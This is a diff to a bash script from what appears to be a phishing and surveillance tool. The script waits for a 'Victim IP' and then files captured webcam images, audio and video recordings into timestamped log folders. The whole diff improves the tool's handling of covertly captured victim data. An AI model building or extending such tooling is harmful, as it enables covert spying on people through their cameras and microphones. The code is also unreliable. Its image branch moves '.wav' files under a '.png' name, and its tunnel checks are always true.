@@ -483,9 +483,11 @@ capture_ip() {
 				echo -e " "
 	if [ reply_tunnel=1 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
 		rm -rf .server/www/ip.txt
 	elif [ reply_tunnel=01 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
 		rm -rf .server/www/ip.txt
 	else
 		ip_details
@@ -572,17 +574,19 @@ capture_data_image() {
                 fi
                 sleep 0.75
             	if [[ -e ".server/www/Log.log" ]]; then
+			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
+			filename=$(date +%d-%m-%Y-%H-%M-%S)
 	               	echo " "
 		        printf "${GREEN} Cam file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
                    	rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
-	               		mv .server/www/*.png  ${logs_full_dir}/
+	               		mv .server/www/*.wav  "${logs_full_dir}/image-${filename}.png"
 			else
 				mkdir ${logs_dir}
 				mv ${logs_dir} ${files_dir}/${site_name}/
-				mv .server/www/*.png  ${logs_full_dir}/
+				mv .server/www/*.wav  "${logs_full_dir}/image-${filename}.png"
 			fi
                 fi
                 sleep 0.5
@@ -591,7 +595,7 @@ capture_data_image() {
 
 capture_data_audio() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
-  while true; do
+	  while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
@@ -599,16 +603,18 @@ capture_data_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
+			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
+			filename=$(date +%d-%m-%Y-%H-%M-%S)
                         printf "${GREEN} Audio file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
 			rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
-                                mv .server/www/*.wav  ${logs_full_dir}/
+                                mv .server/www/*.wav  "${logs_full_dir}/audio-${filename}.wav"
                         else
                                 mkdir ${logs_dir}
                                 mv ${logs_dir} ${files_dir}/${site_name}/
-                                mv .server/www/*.wav  ${logs_full_dir}/
+				mv .server/www/*.wav  "${logs_full_dir}/audio-${filename}.wav"
                         fi
                 fi
                 sleep 0.5
@@ -617,7 +623,7 @@ capture_data_audio() {
 
 capture_data_video() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
-  while true; do
+	while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
@@ -625,16 +631,18 @@ capture_data_video() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
+			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
+			filename=$(date +%d-%m-%Y-%H-%M-%S)
                         printf "${GREEN} Video file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
-                        rm -rf Log.log
+                        rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
-                                mv .server/www/*.webm  ${logs_full_dir}/
+                                mv .server/www/*.webm  "${logs_full_dir}/video-${filename}.webm"
                         else
                                 mkdir ${logs_dir}
                                 mv ${logs_dir} ${files_dir}/${site_name}/
-                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
+                                mv .server/www/*.webm  "${logs_full_dir}/video-${filename}.webm"
                         fi
                 fi
                 sleep 0.5
@@ -643,7 +651,7 @@ capture_data_video() {
 
 capture_data_video_audio() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
-  while true; do
+	while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
@@ -651,10 +659,12 @@ capture_data_video_audio() {
                 fi
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
+			logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
+			filename=$(date +%d-%m-%Y-%H-%M-%S)
                         printf "${GREEN} Video and Audio file received! ${NC}"
 			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
 			echo -ne " "
-                        rm -rf Log.log
+                        rm -rf .server/www/Log.log
 			if [ -d ${logs_full_dir} ]; then
                                 mv .server/www/*.webm  ${logs_full_dir}/
                         else
